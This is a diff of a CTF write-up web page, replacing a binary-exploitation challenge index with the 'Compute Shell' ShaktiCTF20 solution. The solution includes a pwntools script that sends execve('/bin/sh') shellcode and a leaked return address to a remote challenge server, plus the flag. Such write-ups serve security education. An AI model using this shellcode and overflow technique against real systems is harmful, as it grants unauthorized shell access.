@@ -6,9 +6,9 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         
-        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF20/pwning/intro/">
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF20/pwning/compute_shell/">
         <link rel="shortcut icon" href="../../../img/favicon.ico">
-        <title>Binary Exploitation - CTF-Writeups</title>
+        <title>Compute Shell - CTF-Writeups</title>
         <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
         <link href="../../../css/font-awesome.min.css" rel="stylesheet">
         <link href="../../../css/base.css" rel="stylesheet">
@@ -64,7 +64,7 @@
                             </a>
                         </li>
                             <li>
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF20/pwning/intro.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF20/pwning/compute_shell.md">Edit on Team-Shakti/CTF-Write-ups</a>
                             </li>
                     </ul>
                 </div>
@@ -74,55 +74,40 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#binary-exploitation">Binary Exploitation</a></li>
+        <li class="main active"><a href="#compute-shell">Compute Shell</a></li>
+            <li><a href="#challenge-author">Challenge Author</a></li>
+            <li><a href="#challenge-description">Challenge Description</a></li>
+            <li><a href="#short-writeup">Short writeup</a></li>
+            <li><a href="#flag">Flag</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h1 id="binary-exploitation">Binary Exploitation</h1>
-<p>Table containing challenge status</p>
-<table>
-<thead>
-<tr>
-<th align="center">Challenge Name</th>
-<th align="center">Level</th>
-<th align="center">Author</th>
-<th align="center">Concept</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td align="center"><a href="../connect/">Connect</a></td>
-<td align="center">Very Easy</td>
-<td align="center"><a href="https://twitter.com/GeethnaTk">b3y0nd3r</a></td>
-<td align="center">nc,ls,cat</td>
-</tr>
-<tr>
-<td align="center"><a href="../returning/">Returning</a></td>
-<td align="center">Very Easy</td>
-<td align="center"><a href="https://twitter.com/rudyerudite">rudy</a></td>
-<td align="center">return values of snprintf, overflow</td>
-</tr>
-<tr>
-<td align="center"><a href="../compute_shell/">Compute_Shell</a></td>
-<td align="center">Easy</td>
-<td align="center"><a href="https://twitter.com/GeethnaTk">b3y0nd3r</a></td>
-<td align="center">Shellcode</td>
-</tr>
-<tr>
-<td align="center"><a href="../adventure_chain/">Adventure Chain</a></td>
-<td align="center">Easy</td>
-<td align="center"><a href="https://twitter.com/GeethnaTk">b3y0nd3r</a></td>
-<td align="center">ROPchain, passing args</td>
-</tr>
-<tr>
-<td align="center"><a href="../reactor_got/">Reactor_GOT</a></td>
-<td align="center">Medium</td>
-<td align="center"><a href="https://twitter.com/GeethnaTk">b3y0nd3r</a>, <a href="https://twitter.com/rudyerudite">rudy</a></td>
-<td align="center">GOT overwrite</td>
-</tr>
-</tbody>
-</table></div>
+<h1 id="compute-shell">Compute Shell</h1>
+<h3 id="challenge-author">Challenge Author</h3>
+<p><a href="https://twitter.com/GeethnaTk">b3y0nd3r</a></p>
+<h3 id="challenge-description">Challenge Description</h3>
+<p>Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the "alpha" in your favour!</p>
+<h3 id="short-writeup">Short writeup</h3>
+<p>A simple shellcode challenge. </p>
+<pre><code class="python">from pwn import *
+#p = process(&quot;./chall&quot;)
+p = remote('34.72.218.129',3333)
+p.recvuntil(&quot;Memory leak detected:&quot;)
+p.recvline()
+leak = int(p.recvline().strip(),16)
+print(hex(leak))
+#gdb.attach(p)
+p.recvuntil(&quot;Enter your code of action:&quot;)
+exp  = &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;.ljust(0x48,&quot;\x90&quot;)
+exp += p64(leak)
+print(len(exp))
+p.sendline(exp)
+p.interactive()
+</code></pre>
+
+<h3 id="flag">Flag</h3>
+<p>shaktictf{cracking_v0n_neUmann_up}</p></div>
         </div>
 
         <footer class="col-md-12">
